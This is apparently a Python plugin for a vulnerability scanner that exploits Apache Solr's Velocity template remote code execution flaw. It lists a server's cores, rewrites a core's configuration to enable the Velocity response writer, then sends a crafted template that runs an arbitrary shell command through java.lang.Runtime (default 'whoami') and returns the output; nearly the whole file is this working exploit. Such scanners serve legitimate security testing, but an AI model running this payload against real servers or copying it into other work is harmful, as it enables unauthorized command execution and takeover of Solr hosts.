# -*- coding:utf-8 -*-
# Apache Solr Velocity模板远程执行
import json

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan

config_data = {
    "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
    }
}


def get_core(url):
    try:
        resp = requestUtil.get(url + "/solr/admin/cores?_=1626521816720&indexInfo=false&wt=json").json()
        dbs = list(resp["status"].keys())
        return dbs
    except:
        return False


def set_config(url, db):
    try:
        resp = requestUtil.post(url + f"/solr/{db}/config", header={"Content-Type": "application/json"},
                                data=json.dumps(config_data))
        if '"status":0,' in resp.text:
            return db
        else:
            return False
    except:
        return False


def rce(url, db, cmd="whoami"):
    resp = requestUtil.get(
        f'{url}/solr/{db}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x="")+%23set($rt=$x.class.forName("java.lang.Runtime"))+%23set($chr=$x.class.forName(\'java.lang.Character\'))+%23set($str=$x.class.forName("java.lang.String"))+%23set($ex=$rt.getRuntime().exec("{cmd}"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"')
    if resp.status_code == 200 and not "responseHeader" in resp.text:
        print(resp.text)
        return resp.text.strip("0 ").strip('\"')


def fingerprint(service):
    try:
        if service.url and "solr" in service.title.lower():
            return True
        return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        if True:
            dbs = get_core(service.url)
            valid_db = False
            for db in dbs:
                valid_db = set_config(service.url, db)
                if valid_db:
                    break
            if valid_db:
                result = rce(service.url, db=valid_db)
                if result:
                    return (["Apache Solr Velocity模板远程执行", "当前用户: %s" % result], valid_db)
    except:
        return []
